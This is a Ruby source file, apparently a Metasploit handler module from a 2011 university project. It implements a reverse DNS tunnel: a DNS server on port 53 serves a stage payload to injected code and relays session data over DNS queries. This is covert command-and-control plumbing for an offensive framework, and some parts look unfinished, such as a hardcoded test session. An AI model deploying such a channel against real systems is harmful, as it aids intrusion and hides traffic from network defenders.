####################################
# Created by Daan Raman
# Universiteit Gent, 2011
####################################

require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'rex/proto/DNS'

module Msf
module Handler

###
#
# This handler implements the DNS tunneling interface.
#
###
module DnsTunnel

	include Msf::Handler

	###
	# 
	# This class wrappers the communication channel built over the DNS
	# communication protocol between a local session and the remote DNS
	# client.
	#
	###
  @remote_queue = ''
  
	class DNSSessionChannel
    
		include Rex::IO::StreamAbstraction
	  
		module DNSSocketInterface
			
			def type?
				'tcp'
			end
		
			def shutdown(how)
				return false if not remote
				begin
					return (remote.shutdown(how) == 0)
				rescue ::Exception
				end
			end
			
			def peerinfo
				if (pi = getpeername)
					return pi[1] + ':' + pi[2].to_s
				end
			end
			
			def localinfo
				if (pi = getlocalname)
					return pi[1] + ':' + pi[2].to_s
				end
			end
			
			def getlocalname
				getsockname
			end
			
			def getsockname
				return [2,'',''] if not remote
				remote.getsockname
			end
			
			def getpeername
				return [2,'',''] if not remote
				remote.getpeername
			end
			
			attr_accessor :remote
		end #DNSSocketInterface
		
		#DNSSessionChannel
		def initialize(sid)			
			@remote       = nil  
			@sid          = sid
			@remote_queue = ''
			
			initialize_abstraction #Creates lsock and rsock pair. Part of StreamAbstraction.
			lsock.extend( DNSSocketInterface )
			lsock.remote = nil
			
		end

		#
		# Closes the stream abstraction and kills the monitor thread.
		#
		def close
			
		end

		#
		# Sets the remote HTTP client that is to be used for tunneling output
		# data to the client side.
		#
		def remote=(cli)
			# If we already have a remote, then close it now that we have a new one.
			if (@remote)
				begin
					@remote.server.close_client(@remote)
			  rescue
				end
			end

			@remote      = cli
			lsock.remote = @remote
			
			flush_output
		end

		#
		# Writes data to the local side of the abstraction that comes in from
		# the remote.
		#
		def write_local(buf) 
			dlog("DNS Tunnel:#{self} Writing #{buf.length} to local side", 'core', LEV_3)
			rsock.put(buf)
		end

		#
		# Writes data to the remote DNS client via an indirect queue.
		#
		def write_remote(buf)  	
			@remote_queue += buf	    
		end
		
		def getRemote
		  return @remote_queue
	  end
	  
	  def resetRemote
	    @remote_queue = ''
    end
    
		#
		# The write function for Rex::IO::StreamAbstraction.monitor_rsock
		#
		def write(buf)
			write_remote(buf)			
			return buf.length
		end
		
		#
		# The close_write function for Rex::IO::StreamAbstraction.monitor_rsock
		#
		def close_write
			
		end

		

	end #End of DNSSessionChannel
    
	
	module DNSSession

		def payload_handler=(p)
			@payload_handler = p
		end

		def cleanup
			super

			@payload_handler.deref_handler if (@payload_handler)
		end
	end

	class DNSRef
		def initialize
			refinit #Reset reference count
		end

		include Rex::Ref
	end

	#
	# Returns the string representation of the handler type, in this case
	#
	def self.handler_type
		return "reverse_dns"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end

	#
	# Initializes the DNS tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				OptString.new('DOMAIN', [ false, "Domain name", "azertontunnel.chickenkiller.com" ]),
			], Msf::Handler::DnsTunnel)

		# Initialize the start of the localized SID pool
		self.sid_pool = 0
		self.session_channels = Hash.new
		self.handler_ref = DNSRef.new
	end

	#
	# Create a DNS listener that will be connected to and communicated with
	# by the payload that is injected, and possibly used for tunneling
	# purposes.
	#
	def setup_handler
	  
	  comm = datastore['ReverseListenerComm']
		if (comm.to_s == "local")
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end
			
		# Start the DNS server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::DNS::Server, '0.0.0.0', 53, datastore['DOMAIN'], nil, comm)
		self.service.setStage(stage_payload)
		self.service.setHandler(self)
		
		# Create a reference to ourselves
		obj = self
			
		print_status("DNS handler started. [handler/DnsTunnel]")
	end

	#
	# Simply calls stop handler to ensure that things are cool.
	#
	def cleanup_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	# 
	# Stops the service and deinitializes it. 
	#
	def stop_handler
		deref_handler
	end

	def wfs_delay
		3000
	end

  def initSession(name)
    print_status("[HANDLER/DNS_TUNNEL] Initializing session")
    new_session_channel("0") #Dummy session for testing
  end
  
  
	def getRemoteQueue
	  if (find_session_channel("0").getRemote == '' || find_session_channel("0").getRemote == nil)    
	    return nil
    else
      return find_session_channel("0").getRemote
    end
		
	end
	
	def resetRemoteQueue
	    find_session_channel("0").resetRemote
  end
  
	#
	# Called when a new session is created on behalf of this handler.  In this
	# case, we extend the session so that we can track references to the
	# handler since we need to keep the HTTP tunnel up while the session is
	# alive.
	#
	def on_session(session)
		super
    #print_status("[HANDLER/DNS_TUNNEL] on_session called")
    
		# Extend the session, increment handler references, and set up the
		# session payload handler.
		session.extend(DNSSession)
		
		handler_ref.ref

		session.payload_handler = self
	end

	#
	# Decrement the references to the handler that was used by this exploit.
	# If it reaches zero, stop it.
	#
	def deref_handler
		if (handler_ref.deref)
			if (service)
				Rex::ServiceManager.stop_service(service)
	
				self.service.deref
				self.service = nil

				print_status("DNS listener stopped.")
			end
	
			flush_session_channels
		end	
	end

protected

	attr_accessor :service # :nodoc:
	attr_accessor :sid_pool # :nodoc:
	attr_accessor :session_channels # :nodoc:
	attr_accessor :handler_ref # :nodoc:
	attr_accessor :remote_queue # :nodoc:
  

	def on_request(cli, req)
	  print_status("[HANDLER] On_request called in dns_tunnel.rb")
	end

	#
	# Creates a new session with the supplied sid.
	#
	def new_session_channel(sid)
	  self.session_channels[sid.to_i] = DNSSessionChannel.new(sid)
    
	  if (s = find_session_channel(sid))
			framework.threads.spawn("DNS Tunneling client-#{sid}", false) {
				begin
					handle_connection(s.lsock)
				rescue ::Exception
					print_status("Exception raised during DNSTunnel handle connection: #{$!}")
				end
			}
		end
	end
	
	#
	# Finds a session based on the supplied sid
	#
	def find_session_channel(sid)
		session_channels[sid.to_i]
	end
  
	#
	# Flushes all existing session_channels and cleans up any resources associated with
	# them.
	#
	def flush_session_channels
	  session_channels.each_pair { |sid, session|
			session.close
		}

		session_channels = Hash.new
	end
	
	#
	# DNS payloads have a wait-for-session delay of 30 seconds minimum
	# because it can take a bit of time for the DLL to get back to us.
	#
	#def wfs_delay
	#	30
	#end

end

end

end
